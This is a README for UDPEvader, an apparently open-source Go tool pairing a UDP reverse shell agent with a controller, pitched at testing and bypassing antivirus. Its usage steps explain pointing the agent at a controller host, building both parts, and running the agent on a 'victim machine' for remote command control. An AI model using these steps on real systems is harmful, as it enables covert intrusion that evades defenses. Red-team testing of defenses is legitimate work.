# UDPEvader
UDPEvader is a platform independent custom UDP-based reverse shell agent and controller, designed to allow users to  assist in assessing and potentially bypassing antivirus software. Allows to dynamically set their custom port and listener prompts.

## Features

- UDP-based reverse shell agent and controller
- Customizable listener prompts
- Antivirus assessment
- Can be used as a potential bypass technique

## Usage

1. Clone the UDPEvader repository:  

   gh repo clone diljith369/UDPEvader

2. Compile and build the UDPEvader agent and controller:
   - cd UDPEvader/src
   - Update &agentprops.UDPShellProps{
		RemoteServer: "RHOST",
		UDPPort:      "RPORT",
	} in udpagent.go file, replace RHOST and RPORT with controller server IP and Port, then build agent 
   - go build udpagent.go   
   - go build udplistener.go

3. Start the listener :
   - udplistener.exe --lport <LPORT> --prompt <YourPrompt> or 
   - udplistener.exe (In this case LPORT will be 8080 and prompt will be <<@dcrypT0R~UDP>>)

4. Run the agent on your test/ victim machine , once the agent is connected, you can interact with the target machine   through the controller's listener prompts.

5. Assess and test your antivirus or explore potential bypass techniques using the UDPEvader agent.

## Disclaimer
UDPEvader is intended for educational and assessment purposes only. Misuse of this tool may violate applicable laws and regulations. Use it responsibly and at your own risk.

## Suggestions
If you find any issues or have suggestions for improvements, feel free to open an issue.
## Built With
Go Lang
## Author
Initial work - (https://github.com/diljith369)